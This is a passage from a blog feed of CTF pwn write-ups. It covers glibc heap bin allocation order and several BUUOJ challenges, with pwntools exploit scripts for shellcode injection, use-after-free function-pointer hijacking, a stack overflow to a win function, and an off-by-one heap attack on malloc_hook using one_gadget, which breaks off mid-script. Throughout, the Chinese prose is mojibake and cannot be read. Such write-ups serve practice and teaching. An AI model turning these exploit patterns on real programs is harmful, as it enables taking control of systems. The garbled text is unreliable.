ä¸Šå¤´éƒ¨é•¿åº¦ã€å¯¹é½ï¼‰</p></li><li><p>æ˜¯å¦åœ¨fastbinèŒƒå›´å†…ï¼Ÿ</p><ul><li>æ˜¯ï¼Œæ£€æŸ¥å¯¹åº”çš„biné“¾è¡¨ä¸­æœ‰æ²¡æœ‰chunk<ul><li>æœ‰ï¼Œåˆ†é…ç»™ç”¨æˆ·ï¼Œç»“æŸ</li></ul></li></ul></li><li><p>å¦‚æœä¸åœ¨fastbinèŒƒå›´å†…ï¼Œæˆ–è€…æ²¡æœ‰chunkå¯ç”¨</p></li><li><p>æ˜¯å¦åœ¨smallbinèŒƒå›´å†…ï¼Ÿ</p><ul><li>æ˜¯ï¼Œæ£€æŸ¥å¯¹åº”å¤§å°çš„biné“¾è¡¨ä¸­æœ‰æ²¡æœ‰chunk<ul><li>æœ‰ï¼Œåˆ†é…ç»™ç”¨æˆ·ï¼Œç»“æŸ</li></ul></li></ul></li><li><p>å¦‚æœä¸åœ¨smallbinèŒƒå›´å†…ï¼Œæˆ–è€…smallbiné‡Œé¢ä¹Ÿæ²¡æœ‰</p></li><li><p>unsortedbinä¸­æœ‰æ²¡æœ‰chunkï¼Ÿ</p><ul><li>æœ‰ï¼Œä»å°¾éƒ¨å–å‡ºç¬¬ä¸€ä¸ªchunkï¼Œçœ‹çœ‹å¤§å°æ˜¯å¦æ»¡è¶³éœ€æ±‚<ul><li>æ»¡è¶³ï¼Œåˆ‡åˆ†åå¤§å°æ˜¯å¦å¤§äºminsizeï¼Ÿï¼ˆ64ä½ä¸‹minisizeä¸º0x20ï¼‰<ul><li>å¤§äºï¼Œåˆ‡åˆ†å—ï¼Œè¿”å›ç»™ç”¨æˆ·ï¼Œå‰©ä¸‹çš„å—æ”¾è¿›unsortedbin</li><li>å°äºæˆ–ç­‰äºminsizeï¼Œç›´æ¥å…¨éƒ¨åˆ†é…ç»™ç”¨æˆ·ï¼Œç»“æŸ</li></ul></li><li>ä¸æ»¡è¶³ï¼ŒæŠŠè¿™ä¸ªå—æ”¾å…¥small/largebinå¯¹åº”çš„é“¾è¡¨ä¸­ï¼Œç»§ç»­éå†ä¸‹ä¸€ä¸ªå—</li></ul></li></ul></li><li><p>å¦‚æœunsortedbinä¸­æ‰€æœ‰çš„å—ä¹Ÿä¸èƒ½æ»¡è¶³éœ€æ±‚</p></li><li><p>å¤§å°æ˜¯å¦åœ¨largebinèŒƒå›´ï¼Ÿ</p><ul><li>æ˜¯ï¼Œæ£€æŸ¥å¯¹åº”çš„biné“¾è¡¨ä¸­æœ‰æ²¡æœ‰ç¬¦åˆçš„chunk<ul><li>æœ‰ï¼Œæ‰¾åˆ°æ»¡è¶³éœ€æ±‚æœ€å°çš„chunkï¼Œåˆ‡åˆ†å—è¿”å›ï¼Œå‰©ä¸‹çš„æ”¾è¿›unsortedbinä¸­</li></ul></li></ul></li><li><p>largebinä¹Ÿä¸è¡Œï¼Ÿå†æ¬¡éå†small/largeå¯»æ‰¾æœ€åˆé€‚çš„chunk</p></li><li><p>è¿˜æ˜¯æ²¡æœ‰ï¼Œé‚£å°±ä»topchunkä¸­åˆ‡å‰²</p></li><li><p>topchunkä¹Ÿä¸å¤Ÿï¼Ÿmmapç³»ç»Ÿè°ƒç”¨</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E5%90%88%E9%9B%86/image-20210720154252123-1627363406388.png&quot; alt=&quot;image-2</summary>
      
    
    
    
    
    <category term="heap" scheme="http://example.com/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>buu06</title>
    <link href="http://example.com/2021/06/05/2021-06-14-buu06/"/>
    <id>http://example.com/2021/06/05/2021-06-14-buu06/</id>
    <published>2021-06-05T03:33:26.000Z</published>
    <updated>2021-10-13T08:01:21.077Z</updated>
    
    <content type="html"><![CDATA[<h3 id="bjdctf-2020-router"><a href="#bjdctf-2020-router" class="headerlink" title="bjdctf_2020_router"></a>bjdctf_2020_router</h3><p>å¸¸è§„checksecä¸€ä¸‹ï¼Œçœ‹çœ‹ä¿æŠ¤</p><p><img src="/2021/06/05/2021-06-14-buu06/QQ%E5%9B%BE%E7%89%8720210605121040.png"></p><p>åªå¼€å¯äº†NX</p><p>è¿›å…¥idaçœ‹çœ‹ä»£ç <img src="/2021/06/05/2021-06-14-buu06/QQ%E5%9B%BE%E7%89%8720210605121308.png"></p><p>ç¬¬ä¸€ä¸ªåŠŸèƒ½å¾ˆç¥å¥‡çš„è®©æˆ‘ä»¬è¾“å…¥ä¸€ä¸ªé•¿åº¦ä¸º0x10çš„æ•°æ®ï¼Œç„¶åç”¨systemè°ƒç”¨ï¼Ÿæˆ‘è·‘å»ncäº†ä¸€ä¸‹</p><p><img src="/2021/06/05/2021-06-14-buu06/QQ%E5%9B%BE%E7%89%8720210605121007.png"></p><p>å¥½å§ï¼ŒæˆåŠŸè·å¾—flagäº†ã€‚</p><h3 id="picoctf-2018-shellcode"><a href="#picoctf-2018-shellcode" class="headerlink" title="picoctf_2018_shellcode"></a>picoctf_2018_shellcode</h3><p>checksecä¸€ä¸‹<img src="/2021/06/05/2021-06-14-buu06/QQ%E5%9B%BE%E7%89%8720210614103954.png"></p><p>ä¿æŠ¤éƒ½æ²¡å¼€å¯ï¼Œæ‹–å…¥idaåˆ†æä¸€ä¸‹ã€‚æ— æ³•F5åæ±‡ç¼–ï¼Œåªèƒ½çœ‹æ±‡ç¼–ä»£ç äº†ã€‚</p><p><img src="/2021/06/05/2021-06-14-buu06/QQ%E5%9B%BE%E7%89%8720210614104047.png"></p><p><img src="/2021/06/05/2021-06-14-buu06/QQ%E5%9B%BE%E7%89%8720210614104037.png"></p><p>æœ‰ä¸ªvulnå‡½æ•°ï¼Œé‡Œé¢æœ‰è°ƒç”¨getså’Œputsä¸¤ä¸ªå‡½æ•°ï¼Œå¯ä»¥è¿›è¡Œè¾“å…¥ã€‚å†çœ‹å…¶ä»–ä»£ç ï¼Œåº•ä¸‹æœ‰ä¸ªcall eaxï¼Œå¯ä»¥è¿›è¡Œæ‰§è¡Œä»£ç ï¼Œçœ‹ä¸‹eaxçš„å†…å®¹æ¥è‡ªå“ªé‡Œ</p><p><img src="/2021/06/05/2021-06-14-buu06/QQ%E5%9B%BE%E7%89%8720210614104610.png"></p><p>è¿™é‡Œä¼ é€’ç»™eaxçš„åœ°å€ä¸ä¸‹é¢è°ƒç”¨æ—¶ä¸€è‡´ï¼Œç„¶åvulnå‡½æ•°é‡Œé¢getsè¾“å…¥çš„åœ°å€æ˜¯ebp+8ä¸­å­˜æ”¾çš„åœ°å€ï¼Œå…¶å®å°±æ˜¯eaxé‡Œé¢çš„åœ°å€å†…å®¹ï¼Œæ‰€ä»¥æ•´ä¸ªç¨‹åºæ€»çš„è¯´å°±æ˜¯ä¼šæ‰§è¡Œæˆ‘ä»¬è¾“å…¥è¿›å»çš„ä¸œè¥¿ï¼ŒåŠ ä¸Šnxæœªå¼€ï¼Œè¾“å…¥shellcodeæ¥getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">28165</span>)<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>shellcode=asm(shellcraft.sh())<br>p.sendlineafter(<span class="hljs-string">&quot;string!&quot;</span>,shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="hitcontraining-uaf"><a href="#hitcontraining-uaf" class="headerlink" title="hitcontraining_uaf"></a>hitcontraining_uaf</h3><p>å¸¸è§„checksecä¸€ä¸‹</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210727132448387.png" alt="image-20210727132448387"></p><p>è¿›å…¥idaçœ‹çœ‹ï¼Œå…¶å®é¢˜ç›®å·²ç»æœ‰æš—ç¤ºï¼Œuafï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆå»deleteå‡½æ•°é‡Œé¢çœ‹çœ‹ï¼Œ</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210727132528641.png" alt="image-20210727132528641"></p><p>ç¡®å®å­˜åœ¨ç€uafï¼Œé‚£ä¹ˆè¯¥æ€ä¹ˆåˆ©ç”¨ï¼Ÿå†çœ‹çœ‹addå‡½æ•°å’Œprintfå‡½æ•°</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210727132617843.png" alt="image-20210727132617843"></p><p>è¿™è¾¹çš„addå‡½æ•°æ¯”è¾ƒå¥‡æ€ªï¼Œé¦–å…ˆæ˜¯æœ‰æ¬¡æ•°é™åˆ¶åªèƒ½ç”³è¯·äº”ä¸ªå †å—ï¼Œå…¶æ¬¡æ˜¯ä¼šç”³è¯·ä¸¤ä¸ªå †å—ï¼Œç¬¬ä¸€ä¸ªå †å—æ˜¯å›ºå®š8å­—èŠ‚å¤§å°ï¼Œå‰4ä¸ªå­—èŠ‚å­˜æ”¾ä¸€ä¸ªprint_note_contentå‡½æ•°çš„åœ°å€ï¼Œå4ä¸ªå­—èŠ‚æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼Œç”³è¯·ä¸€ä¸ªä»»æ„å¤§å°çš„å †å—</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210727132832076.png" alt="image-20210727132832076"></p><p>åœ¨printå‡½æ•°é‡Œé¢ï¼Œæœ€åä¼šè¿›è¡Œå‡½æ•°è°ƒç”¨ï¼Œå°±æ˜¯è°ƒç”¨å…ˆå‰åœ¨addå‡½æ•°é‡Œé¢ä¿å­˜çš„print_note_contentå‡½æ•°è¿›è¡Œæ‰“å°æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„å †å—é‡Œé¢çš„å†…å®¹</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210727133015119.png" alt="image-20210727133015119"></p><p>æœ€åå°±æ˜¯è¿˜å­˜åœ¨ä¸€ä¸ªåé—¨å‡½æ•°</p><p>æ€è·¯ï¼šä¸€å¼€å§‹æ˜¯è§‰å¾—æ²¡æœ‰editè¿™ç±»çš„å‡½æ•°ï¼Œå¯èƒ½æ˜¯è¦åˆ¶é€ å †å—é‡å ï¼ŒæŠŠåé—¨å‡½æ•°åŠ«æŒåˆ°malloc_hooké‡Œé¢å»ï¼Œè¿˜ä»¥ä¸º5ä¸ªä¼šå¤Ÿï¼Œä½†æ˜¯ä¸€ä¸ªæ³„éœ²libcåŸºå€ï¼Œå†ä¸€ä¸ªç”³è¯·fastchunkè¿›è¡Œdouble freeï¼Œç„¶åè¿˜éœ€è¦ç”³è¯·å››æ¬¡ï¼Œè¶…è¿‡æ¬¡æ•°äº†</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210727135534549.png" alt="image-20210727135534549"></p><p>è¿™æ˜¯double freeçš„fastbinä¸Šçš„æƒ…å†µï¼Œå› ä¸ºfreeä¹Ÿæ˜¯ä¸¤ä¸ªï¼Œæ‰€ä»¥ç›´æ¥è¿›è¡Œä¸¤æ¬¡æ“ä½œç›´æ¥å°±å¯ä»¥æ„é€ å‡ºA-B-A</p><p>æ‰€ä»¥æ¢ä¸€ç§æ–¹æ³•ï¼šåˆ©ç”¨é‚£ä¸ªå‡½æ•°è°ƒç”¨ï¼Œæƒ³åŠæ³•æŠŠè¿›è¡Œè°ƒç”¨çš„å †å—å˜æˆæ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„é‚£ä¸ªå †å—ï¼ŒæŠŠå†…å®¹æ”¹æˆåé—¨å‡½æ•°ï¼Œé‚£ä¹ˆå°±å¯ä»¥getshelläº†ï¼</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210727140624461.png" alt="image-20210727140624461"></p><p>åƒè¿™æ ·ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„å †å—ç”³è¯·ä¸€ä¸ªæ¯”0x8å¤§çš„å †å—ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±ä¸ä¼šç”³è¯·èµ°ï¼Œè€Œå›ºå®šç”³è¯·å¤§å°ä¸º0x8çš„å †å—å°±ä¼šç”³è¯·èµ°ä¸€ä¸ªï¼Œæ­¤æ—¶æˆ‘ä»¬ï¼Œå¦‚æœå†ç”³è¯·0x8çš„å †å—ï¼Œå°±ä¼šè¿›è¡Œæ›´æ¢äº†ï¼Œæˆ‘ä»¬ç”³è¯·åˆ°çš„å°±æ˜¯ä¹‹å‰ç¨‹åºçš„å›ºå®šå †å—ï¼Œæœ€åprintfä¸€ä¸‹ï¼Œå°±getshelläº†ï¼</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210727141018340.png" alt="image-20210727141018340"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;i386&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./hacknote&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/ld-2.23.so&quot;</span>)<br><span class="hljs-comment">#p = process(argv=[ld.path,elf.path],env=&#123;&quot;LD_PRELOAD&quot; : libc.path&#125;)</span><br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">26333</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>  p.sendlineafter(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Note size :&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>  p.sendlineafter(<span class="hljs-string">&#x27;Content :&#x27;</span>,content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>  p.sendlineafter(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">printf</span>(<span class="hljs-params">idx</span>):</span><br>  p.sendlineafter(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><br>shell_addr=<span class="hljs-number">0x8048945</span><br>add(<span class="hljs-number">0x8</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x8</span>,p32(shell_addr))<br>printf(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#debug()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="picoctf-2018-buffer"><a href="#picoctf-2018-buffer" class="headerlink" title="picoctf_2018_buffer"></a>picoctf_2018_buffer</h3><p><img src="/2021/06/05/2021-06-14-buu06/image-20210728144721443.png" alt="image-20210728144721443"></p><p>checksecçš„æƒ…å†µæ¥çœ‹ä»¥åŠåå­—ï¼Œåº”è¯¥æ˜¯é“æ ˆé¢˜ç›®ï¼Œè¿›å…¥idaçœ‹çœ‹</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210728144750715.png" alt="image-20210728144750715"></p><p>æ¼æ´ç‚¹åº”è¯¥æ˜¯åœ¨è¿™äº†ï¼Œå­˜åœ¨æ˜æ˜¾æ ˆæº¢å‡º</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210728145612076.png" alt="image-20210728145612076"></p><p>ç¨‹åºæœ¬èº«è¿˜è•´å«ç€ä¸€ä¸ªå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¼šè¯»å–flagé‡Œé¢çš„å†…å®¹ï¼Œåªè¦é€šè¿‡åˆ¤æ–­å³å¯æ‰“å°å‡ºflag</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210728145716640.png" alt="image-20210728145716640"></p><p>è€Œè¿™é‡Œçš„a1ï¼Œa2å°±æ˜¯è¯¥å‡½æ•°çš„å‚æ•°ã€‚</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210728150414970.png" alt="image-20210728150414970"></p><p>æˆåŠŸè·å–flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28765</span>)<br>win_addr=<span class="hljs-number">0x080485CB</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span>+p32(win_addr)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0xDEADBEEF</span>)+p32(<span class="hljs-number">0xDEADC0DE</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Please enter your string:&quot;</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="roarctf-2019-easy-pwn"><a href="#roarctf-2019-easy-pwn" class="headerlink" title="roarctf_2019_easy_pwn"></a>roarctf_2019_easy_pwn</h3><p>å¸¸è§„checksecä¸€ä¸‹ï¼Œä¿æŠ¤å…¨å¼€ï¼Œå¯èƒ½æ˜¯é“å †é¢˜äº†ï¼Œè¿›å…¥idaçœ‹çœ‹ç¨‹åº</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210728151846042.png" alt="image-20210728151846042"></p><p>æ¼æ´ç‚¹åœ¨äºwriteå‡½æ•°é‡Œé¢</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210730125048904.png" alt="image-20210730125048904"></p><p>è¿™é‡Œä¼šæŠŠæˆ‘ä»¬ä¹‹å‰ç”³è¯·å †å—æ—¶è¾“å…¥çš„sizeä¸ç°åœ¨è¦å†™å…¥çš„sizeè¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœæˆ‘ä»¬ç°åœ¨å†™å…¥çš„sizeæ¯”åŸæ¥çš„sizeå¤§10ï¼Œå°±å¯ä»¥å¤šå†™ä¸€ä¸ªï¼Œæ‰€ä»¥æ¼æ´ç‚¹æ˜¯offbyone</p><p>æ³„éœ²libcï¼Œå› ä¸ºcallocä¼šæ¸…ç©ºå †å—çš„æ•°æ®ï¼Œæ‰€ä»¥è¿™è¾¹å€Ÿç€æº¢å‡ºï¼ŒæŠŠis_mmapä½æ”¹ä¸º1ï¼Œå°±ä¸ä¼šè¢«æ¸…ç©ºæ•°æ®ï¼Œå€Ÿæ­¤æŠŠlibcæ³„éœ²å‡ºæ¥</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210730215233503.png" alt="image-20210730215233503"></p><p>ç„¶åå°±åˆ©ç”¨offbyoneä¿®æ”¹å †å—çš„sizeï¼Œåˆ¶é€ overlopï¼Œä¿®æ”¹è¢«è¦†ç›–çš„å †å—çš„fdæŒ‡é’ˆï¼Œç„¶åæŠŠå †å—ç”³è¯·åˆ°malloc_hookä¸Šå»</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210730233057769.png" alt="image-20210730233057769"></p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210730233446054.png" alt="image-20210730233446054"></p><p>è¿™è¾¹æˆ‘å·²ç»æˆåŠŸå†™è¿›å»äº†ï¼Œä½†æ˜¯æ²¡æœ‰getshellï¼Œå››ç§éƒ½æ²¡åŠæ³•getshellï¼Œé‚£æ¥ä¸‹æ¥ï¼Œå°±æœ‰å¾ˆå¤šå¤„ç†æ–¹å¼äº†</p><ul><li>è½¬è€Œå»ä¿®æ”¹free_hookå‡½æ•°</li><li>åˆ©ç”¨reallocè°ƒæ•´æ ˆå¸§</li><li>house of orangeï¼ˆé€šæ€2.23ä»¥åŠ2.24ï¼‰</li></ul><p>è¿™è¾¹æˆ‘ä½¿ç”¨reallocè°ƒæ•´æ ˆå¸§ï¼Œå…¶ä»–æ–¹æ³•åç»­ä¼šæ›´æ–°çš„ï¼ˆæˆ‘ä¹Ÿä¸çŸ¥é“åç»­æ˜¯å¤šä¹…~ï¼‰</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210731002134507.png" alt="image-20210731002134507"></p><p>è¿™è¾¹å¯ä»¥çœ‹è§ï¼Œå¹¶ä¸ä¼šä¸ºNULLï¼Œæ‰€ä»¥one_gadgetæ¡ä»¶æ²¡æœ‰è¾¾æˆï¼Œç„¶åçœ‹çœ‹realloc,ä¼šå‹æ ˆ</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210731002037708.png" alt="image-20210731002037708"></p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210731002752890.png" alt="image-20210731002752890"></p><p>å‘ç°ï¼Œå…¶å®å‹æ ˆå¯¼è‡´çš„rsp-0x8ï¼Œå·²ç»è®©one_gadgetçš„æ¡ä»¶è¾¾æˆäº†ï¼Œæ‰€ä»¥å°±ä¸ç”¨å†å»æ‰¾äº†</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210731001850853.png" alt="image-20210731001850853"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./roarctf_2019_easy_pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25420</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;size: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,size,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;size: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size+<span class="hljs-number">10</span>))<br>p.recvuntil(<span class="hljs-string">&quot;content: &quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;content: &quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x88</span>)<span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#4</span><br>free(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x68</span>,<span 